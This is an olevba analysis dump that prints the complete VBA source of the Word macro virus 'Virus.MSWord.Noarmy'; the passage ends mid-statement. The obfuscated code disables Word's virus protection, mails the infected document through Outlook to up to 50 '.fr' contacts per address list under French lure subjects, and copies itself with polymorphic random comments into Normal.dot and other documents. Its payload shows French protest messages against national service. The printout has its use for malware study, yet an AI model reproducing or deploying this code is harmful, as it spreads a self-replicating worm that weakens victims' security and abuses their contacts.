olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noarmy-5eefd6f36d45a1f6aa40b70ec923b7c18f20d24c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: Virus.MSWord.Noarmy-5eefd6f36d45a1f6aa40b70ec923b7c18f20d24c - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, d3, g6, h3, k1, k5, _
g3, n6, h5, j5, k7: Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, c4, f3, h1, d8: Dim g5, e1, m4, _
b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' cwrgawuvssrxhra
Private Sub Document_Close() ' rftkwnfdqwpazx
On Error Resume Next ' qztya
Call f1: Call f2: Randomize: Select Case System.PrivateProfileString(j1, k2, j8) ' peaw
Case Is <> j1 ' tmoiaandqg
System.PrivateProfileString(j1, k2, j8) = 1&: Case Else: Options.ConfirmConversions = m5: Options.VirusProtection = m5: Options.SaveNormalPrompt = m5 ' xdaaxpmc
End Select: d8 = a5 ' pjammw
Set c4 = CreateObject(d8) ' luqmccmcaheg
Set f3 = c4.GetNameSpace(l8) ' solhdqkyuajbsuu
Select Case System.PrivateProfileString(j1, d3, g6) ' qzpspryoqbmafmt
Case Is <> h3: Select Case c4: Case k1 ' bqsxyanotmtgwym
f3.Logon k5, g3: For i = _
1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i) ' euqokjnment
Set h1 = c4.CreateItem(m5) ' rgkbszbunyjq
h2 = g4.AddressEntries.Count ' wmkcov
b6 = m5: For j = 1 To h2: Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address): Case Is > 4 ' yhzj
Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, _
vbTextCompare): Case Is <> 0 ' oocdpaghke
h1.Recipients.Add j2: b6 = b6 + 1 ' pkcov
End Select: End Select ' mufonw
Select Case b6: Case 50: Exit _
For: End Select ' yutdgly
Next j: Select Case Rnd(): Case Is < _
0.33: h1.Subject = h5 ' iumhnok
h1.Body = j5: Case Is < 0.66: h1.Subject = g1 ' jfusllq
h1.Body = l3 ' lezlodi
Case Else: h1.Subject = l9 ' ayxiymv
h1.Body = n2 ' ineutdeokhjfx
End Select ' hdaeinqiffykapi
h1.Attachments.Add ActiveDocument.FullName ' djcfp
h1.Send: Next i: f3.Logoff ' uotwyewttljrue
End Select ' ydukjsahfsi
System.PrivateProfileString(j1, d3, g6) = h3 ' voplmkxaiknozz
End Select ' bhopwbujfhu
Set n1 = ActiveDocument.VBProject ' qqfiolkfrwbwe
Set i6 = n1.VBComponents.Item(1): Set n1 = NormalTemplate.VBProject ' mzuwqhspgiftcca
Set k3 = _
n1.VBComponents.Item(1): i2 = False ' bfigyza
Select Case InStr(1, ActiveDocument.Name, m1): Case False ' cjfwlogvinqc
Select Case i6.Name ' rmjsbh
Case Is <> g6 ' hfsyuvknolfd
Set b5 _
= k3: Set f5 = i6: i2 = True: End Select ' lojknihntcrlgf
End Select: Select Case k3.Name ' ollzgt
Case Is <> g6 ' ionuzaa
Set b5 = i6 ' dwzyqkqnlp
Set f5 = k3: i2 = True: End Select: Select Case i2: Case True ' sixmngpeiid
i4 = b5.CodeModule.CountOfLines - _
1: c8 = f5.CodeModule.CountOfLines ' tmafkjyvxdezdo
Select Case c8: Case Is > 0: f5.CodeModule.DeleteLines 1, c8 ' mcjylvsw
End Select: c6 = 1 ' eddibdn
c9 = "": j3 = "" ' cgusxieqyzlsk
a6 = 0: For l2 = 1 To i4 ' itcsuug
h4 = b5.CodeModule.Lines(l2, 1): i = 1 ' ocxsjfjhbzwpd
f4 = InStr(1, h4, Chr(39)) ' qnaecujvlej
Select Case _
f4: Case 0: f4 = Len(h4): Case Else: f4 = _
f4 - 2 ' qtzfpjwrew
End Select: Do: j = InStr(i, h4, Chr(32)): Select Case j: Case 0 ' vsbpeduu
j = Len(h4) + 1: b8 = True ' ppfzvdcawvxgmkg
Case f4 + 1 ' xzgnj
b8 = True ' xrgsdalsled
Case Else ' kipbpii
b8 = False ' zigyvtdyeztbw
End Select ' erichvtnc
n5 = Mid(h4, i, j - _
i): Select Case b8 ' qgfepoausi
Case True: f6 = b5.CodeModule.Lines(l2 + 1, 1) ' cxmgamzcqnmapj
k4 = InStr(1, f6, Chr(32)): Select Case k4: Case 0: j3 = "" ' yidavoatnzlsfpr
Case Else: j3 = Mid(f6, 1, _
k4 - 1): End Select: End Select: Select Case n5: Case k7 + Chr(58) ' rkfmmffldxg
n5 = e8 + Chr(58) ' araf
Case e8 _
+ Chr(58): n5 = k7 + Chr(58) ' bxgzeccjlrstyl
Case k7: n5 = e8 ' lqztao
Case e8: n5 = k7: End Select: Select Case h6: Case False: Select Case Rnd(): Case Is < 0.02 ' wxkwr
h6 = True: Case Else: h6 = False ' ueplkzlkmlib
Select Case b8: Case True: Select Case l2: Case i4 ' yuqfnimrs
h6 = True: End Select: Select Case Rnd(): Case Is < 0.5: h6 = True: End Select: Select Case j3: Case e4 ' qofy
h6 = True ' glasprzhziqpi
a6 = a6 + 1: Select Case a6 ' virqmyfhhodap
Case 4 ' khqcewgjfls
l2 = i4 ' mbuozopmg
End Select ' wdmonczzqrw
End Select ' rateivibgtpy
Select Case InStr(1, h4, c7): Case Is <> _
0: Select Case n5: Case j17: h6 = False: Case _
Else: h6 = True: End Select ' wvykm
End Select ' cbwcrponf
End Select: End Select: Select Case Len(n5) ' nrrc
Case Is <> 0 ' zawhhcvdagntb
Select Case InStr(Len(n5), _
n5, Chr(58)): Case Is <> 0 ' hwkc
Select Case Rnd(): Case Is _
< 0.5 ' xkbityn
h6 = True ' jnnhvbkgaijijv
End Select ' lpemaw
End Select: End Select: Case Else ' upmwqzrh
h6 = False: End Select ' gfvhu
Select Case _
b8: Case True: Select Case n5 ' crklqcdnsihqua
Case Chr(95) ' usrlipuzglpypbe
c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1): j4 = False: Case Else: c9 = c9 + Switch(h6 _
= True, n5, h6 = False, n5 + Chr(58) + Chr(32)) ' xrgrc
j4 = True: End Select: Case Else ' gevfp
Select Case InStr(Len(n5), n5, Chr(58)) ' vcqzppyd
Case 0: c9 = c9 + Switch(h6 = True, n5 + Chr(32) + Chr(95), h6 = False, _
n5 + Chr(32)) ' aaoflssiwocpcx
j4 = False: Case Else ' zpof
c9 = c9 + Switch(h6 = True, Mid(n5, _
1, Len(n5) - 1), h6 = False, n5 + Chr(32)) ' pezjfivxjsj
j4 = True: End Select ' vxdzpkqn
End Select: Select Case h6 ' eewh
Case True: Select Case j4: Case True: c9 = c9 + Chr(32) + Chr(39) + Chr(32) ' acmymylquw
e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6 ' esluvtkunzytcaa
c9 = c9 + Chr$(Int((26 * Rnd) + 97)): Next d5: End Select: f5.CodeModule.InsertLines c6, c9 ' zmfvf
c6 = c6 + 1: c9 = "": End Select: i = j + 1: Select Case _
b8: Case True ' eshtvk
Exit Do: End Select ' poerdyl
Loop: Next l2 ' dcqdxzt
Select Case k3.Name ' jthqcvmhy
Case Is <> g6: f5.Name = g6: NormalTemplate.Save: End Select: Select Case i6.Name: Case Is <> g6: f5.Name = g6 ' hoebqzvxd
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True ' xwwhkonjfknfi
End Select: Case Else: Select _
Case InStr(1, ActiveDocument.Name, m1): Case _
False: Select Case Rnd() ' adiy
Case Is < 0.015: MsgBox h8 + l5 + i1 + i7, 32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16 ' pajeigscntbvnrs
MsgBox i3 + g2 + e5 + d2 + a4, 16 ' ipnrsuabe
MsgBox a3 + a2 + c2 + d1 + c3, 16 ' nxiuynvjff
MsgBox c1 + b2, 16 ' rodg
MsgBox b1 + a1, 48: Case Is < 0.03 ' egykvvzierc
Selection.TypeText b9 ' ikfnkidxvkz
Case Is < 0.045: Selection.TypeText a7: Case Is < 0.06: Selection.TypeText d6: Case Is < 0.075 ' bdcfyvidoz
Selection.TypeText c5: Case Is < 0.09: Selection.TypeText e2: End Select: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True: End Select: End Select: End Sub ' umpw
Private Sub f1() ' vpgsmkxs
h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) ' waohhgok
g8 = Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) _
+ Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46) ' jjoyywqij
j1 = "": k2 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + _
Chr(82) + Chr(69) + Chr(78): k2 = k2 + Chr(84) + Chr(95) + Chr(85) + _
Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + _
Chr(102): k2 = k2 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' gfqbjmahtlciro
k2 = k2 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) _
+ Chr(101) + Chr(92) + Chr(57) + _
Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114): k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121): j8 = Chr(76) + Chr(101) + Chr(118) + _
Chr(101) + Chr(108) ' hxsa
l1 = Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) ' tzjor
m5 = 0: l8 = Chr(77) + Chr(65) + Chr(80) + Chr(73) ' fhdscnsjq
a5 = _
Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) ' gidrlhxoimcuiky
a5 = a5 + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110): d3 = Chr(72) + Chr(75) _
+ _
Chr(69) + Chr(89) + _
Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78): d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 _
+ Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' scuzkf
d3 = d3 + Chr(99) + Chr(101) _
+ Chr(92): g6 = Chr(78) _
+ Chr(79) + Chr(83) + Chr(78): h3 = "Non" + Chr(32) + "au" + Chr(32) + "Service" + Chr(32) + "National" _
+ Chr(32) + _
"-" + Chr(32) + "Oui" + Chr(32) ' xmuvlclnkdr
h3 = h3 + "au" + Chr(32) + "Contrat" _
+ Chr(32) + "de" + Chr(32) + "Travail" ' swmzmd
k1 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) ' hvaqel
k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101) ' oeotmgyxh
g3 = Chr(112) _
+ Chr(97) _
+ Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100): n6 = Chr(46) _
+ Chr(102) + Chr(114): h5 = "Suggestion..." ' takneifhvyrxsdz
j5 = "Ce" + Chr(32) + "document" + Chr(32) + "(" + ActiveDocument.Name + ")" + Chr(32) + "vaut" + Chr(32) + "bien" ' iusorhpwl
j5 = j5 + _
Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) _
+ "savoir" + Chr(32) + "s" + Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" _
+ Chr(32): j5 = j5 + "qu" + Chr(39) + "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13) ' cohvhynh
k7 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95): k7 = k7 + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41): e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) ' tkhsypqynhxn
e8 = e8 + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + _
Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32) ' zrhmceep
a7 = _
Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32): d6 = Chr(32) + _
"http://www.donquichotte.com" + Chr(32): c5 = Chr(32) + "http://www.multimania.com/antisn" + Chr(32) ' ygjrsyst
e2 = _
Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) _
+ "Oui" + Chr(32) + "à" + Chr(32) + _
"l" + _
Chr(39) + "armée" + Chr(32): e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + "au" + Chr(32) + "service" ' gcugp
e2 = e2 + Chr(32) + "national" + Chr(32) + "sous" + Chr(32) + "contrat" + _
Chr(32) + "de" + Chr(32) + "travail," + Chr(32) ' juca
e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "absurdité." + Chr(32) ' gfhuypos
g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide...": l3 = "Je" _
+ Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + _
"un" + Chr(32) + "peu": l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + "à" + Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document": l3 = l3 + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Merci" + Chr(32) + _
"de" + _
Chr(32) + "m" + Chr(39) + "aider" + Chr(32): l3 = l3 _
+ "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + Chr(39) + "améliorer..." + _
Chr(13): l9 = "Version" + Chr(32) + "finale" ' eytbegjwz
n2 = "Voici" + Chr(32) + "la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + Chr(32) + "quoi" _
+ _
Chr(32) + "j" + Chr(39) + "ai" + Chr(32) _
+ "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers" ' sjhwivhc
n2 = n2 + Chr(32) + "temps" + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32) ' kdrfviwspng
n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) + "la" + Chr(32) + "bienvenue" + Chr(32) + "!" + Chr(13) ' siaimrfks
m1 = "Document" ' hiexkqr
h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) + "à" + Chr(32) + "résoudre" + Chr(32) + "est" + _
Chr(32): h8 = h8 + _
"le" + _
Chr(32) + "suivant:" + Chr(13) + Chr(13): End Sub ' drynbkorfly
Private Sub f2() ' gtmlivme
l5 = "Lors" + Chr(32) + "de" + Chr(32) _
+ "son" + Chr(32) + "intervention" + _
Chr(32) + "télévisée" + Chr(32) + "du" + Chr(32) + "22" + Chr(32) ' rnnundnnhjq
l5 = l5 + _
"février" + Chr(32) + "1996," + Chr(32) + "Jacques" + Chr(32) + "Chirac," + Chr(32) + "Président" + _
Chr(32) + "de" + Chr(32) + "la": l5 = l5 + Chr(32) + "République" + Chr(32) _
+ "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + "a" + Chr(32) + "proclamé:" + Chr(32): i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) _
+ "plus" + Chr(32) + "besoin" + Chr(32) + "d" _
+ Chr(39) + "appelés..." + Chr(32) + "(Le" + Chr(32) _
+ "service" + Chr(32) ' vlmmaxbzcfvr
i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + _
Chr(32) + "il" + Chr(32) + "n" + Chr(39) + _
"est" + Chr(32) + "plus" ' mpwzufucwrmcafy
i1 = i1 _
+ Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été" ' teatpcdg
i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + "tous..." + _
Chr(32) + "ou" + Chr(32) + "presque:" + Chr(32) ' dgtfqbzxp
i7 = "Alors" + Chr(32) + "qu" + Chr(39) _
+ "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" + Chr(32) + "obligatoire" + Chr(32) + _
"pour" + Chr(32) + "les" + Chr(32) + "gens" ' ofkholjpijasy
i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + Chr(32) + "nés" + Chr(32) + "avant" + Chr(32): i7 = i7 + "1979" + Chr(32) + "peuvent" + Chr(32) + "encore" + Chr(32) + _
"perdre" + Chr(32) + "emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32): i7 = _
i7 + "de" + Chr(32) + "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + "du" + Chr(32) + "Service" + Chr(32) + "National.": g5 = "En" + Chr(32) + "réalité," + Chr(32) + "la" + Chr(32) _
+ "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + Chr(32) + "bien" + Chr(32) + "pire" + Chr(32) ' vlbavoqopjjkh
g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) + "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32): g5 = g5 + "de" + Chr(32) + "2" + _
Chr(32) + "ans" + Chr(32) + "aux" + Chr(32) ' ygvwchcziih
e1 = "jeunes" + Chr(32) + _
"ayant" + Chr(32) + "obtenu" + Chr(32) + _
"Contrat" + Chr(32) + "de" + Chr(32) + "Travail," + Chr(32) + "l" + Chr(39) + "Armée" + Chr(32) + "a" + Chr(32) ' zpqmx
e1 = _
e1 + "l" + Chr(39) + "intention" + Chr(32) + "de" + Chr(32) + _
"les" + Chr(32) + "rappeler" + _
Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32) ' duaiivb
e1 = e1 + _
"leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" + Chr(32) + "sont" + Chr(32) _
+ "bien" + Chr(32): e1 = e1 + "sûr" + Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Vivre" + _
Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "ne" ' jeoaizgyyjq
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" _
+ Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32) ' pblom
b3 = "impôts" + Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" _
+ Chr(32) + "à" + Chr(32) + "assumer" + Chr(32) + "dans" + Chr(32) + "un" ' wsgqwwujbgyfwg
b3 = b3 + Chr(32) + "début" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + _
Chr(13) + Chr(13) ' ncbec
d4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Ne" + Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + _
Chr(32) + "activité" + Chr(32) + "professionnelle" + Chr(32) ' vbympltg
d4 = d4 + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" + Chr(32) + "implique" + Chr(32) + "également" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "d" + Chr(39) + "expérience" ' itucmbzlzfylidf
d4 = d4 + Chr(32) + "utile," _
+ Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) + "une" + Chr(32) + "période" + Chr(32) ' kcuiqbekzlahkn
f7 = "de" + Chr(32) + "réadaptation," _
+ Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" + Chr(32) + "professionnel" ' jfaogsik
f7 = f7 + Chr(32) + "et" _
+ Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + "inquantifiable" + Chr(32) + "colère" _
+ Chr(32) + "des" _
+ Chr(32) + "employeurs," + Chr(32): f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" + Chr(32) + "ou" + Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32) ' scrcrdh
f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" + Chr(32) + "de" + _
Chr(32) + "carrière.": i3 = Chr(32) + Chr(32) + "-" + _
Chr(32) + "Du" + Chr(32) + "fait" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "soit" + Chr(32) + "tout" + Chr(32) + "bonnement" + Chr(32) + "impossible" ' rjkmgblf
i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "sur" + Chr(32) ' rzvrebdryxgnyp
i3 = i3 + "cette" + Chr(32) + "période," + Chr(32) ' twnosvkzluh
g2 = "l" + Chr(39) + "abandon" _
+ Chr(32) + "du" + Chr(32) + "logement" + Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) _
+ "Qui" + Chr(32) + "prendra" + Chr(32) + "alors" + Chr(32): g2 = g2 + "en" _
+ Chr(32) + "charge" + Chr(32) _
+ "les" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32): g2 = g2 + "et" + Chr(32) _
+ "de" + Chr(32) + "recherche" + Chr(32) + "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' lyiy
e5 = Chr(32) + Chr(32) + "-" + Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32) ' oapvmb
e5 = e5 + "au" + Chr(32) + "plus" + Chr(32) + "bas" + Chr(32) + "durant" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + "longs" + Chr(32) + "mois" + Chr(32) + "?" + Chr(32): e5 = e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32): e5 = e5 + "bâtir" + Chr(32) + "s" + _
Chr(39) + "effondre" + _
Chr(32) + "pour" _
+ Chr(32) + "laisser" + Chr(32) + "place": d2 = Chr(32) + "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" _
+ Chr(32) + "a" + _
Chr(32) + _
"l" + Chr(39) + "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du" ' twdkmfs
d2 = d2 + Chr(32) + "Service" + Chr(32) + "National." _
+ Chr(32) + _
"Est-il" + Chr(32) + _
"possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + "loin" + Chr(32) + "de" ' axlcgnuomimn
a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" + Chr(32) + "ses" + Chr(32) _
+ "relations," + Chr(32) + "de" ' povp
a4 = Chr(32) + "ses" + Chr(32) + _
"amis," + Chr(32) + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" _
+ Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + "si" ' zmkx
a4 = a4 + Chr(32) + "rien" + Chr(32) + "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + _
"?": a3 = "Certains" + _
Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + _
"Service" + Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) _
+ "devoir" ' kqcy
a3 = a3 + Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" + _
Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32) ' rqblzfcc
a3 = a3 + "ses" + Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "la" _
+ Chr(32) + "sécurité" + Chr(32) + "sociale," + Chr(32) + "des" ' ikqvdciphiv
a3 = a3 + Chr(32) + "allocations" + Chr(32) + "chômage," ' tuagskvbfljuzpx
a2 = Chr(32) + _
"des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) _
+ "sûr" + Chr(32) + "les" + Chr(32) + "personnes" + Chr(32) + "qui" ' wwnipzphhdqqyj
a2 = a2 + Chr(32) _
+ "travaillent" + Chr(32) + "qui" + _
Chr(32) + "payent" + Chr(32) + _
"tout" + Chr(32) + "cela," + Chr(32) + "et" + Chr(32) + "les" + Chr(32) + "actuels" + Chr(32) + "sursitaires" ' icfkjkifskpbv
a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) + "partie." + Chr(32) + "Ils" + Chr(32) + "sont" _
+ Chr(32) _
+ "bien" + Chr(32) + "plus" + Chr(32) + "utiles" + Chr(32): c2 = "à" + Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" _
+ Chr(32) + "tant" + Chr(32) + "que" + Chr(32) + "cotisants" + _
Chr(32) + "qu" + Chr(39) + "en" + _
Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32) ' wmtfqsmt
c2 = c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' dctcltmfmtjg
d1 _
= "Le" + Chr(32) + "service" + Chr(32) _
+ "national" + Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" + Chr(32) + "son": d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) _
+ "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32) ' lzegkrpuywsol
d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." _
+ _
Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) + "véritable" + Chr(32) + "utopisme": d1 = d1 + Chr(32) + "et" + Chr(32) + "le" + Chr(32): c3 = "bilan" + Chr(32) + "ne" + _
Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + "à" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "de" + _
Chr(32) + "10" + Chr(32) + "mois" + Chr(32) ' yuezpvjqizfoiqf
c3 = c3 + "de" + Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "une" + Chr(32) + "véritable" + Chr(32) + _
"catastrophe" + Chr(32) + "pour" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "financière,": c3 = c3 + _
Chr(32) + "matérielle" + Chr(32) + "et" _
+ Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) + "des" + Chr(32) + _
"répercutions" + Chr(32): c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables." ' rthdhhunuhrqizr
c1 = "Ils" + _
Chr(32) + "sont" + _
Chr(32) + "environ" + Chr(32) + "250" + _
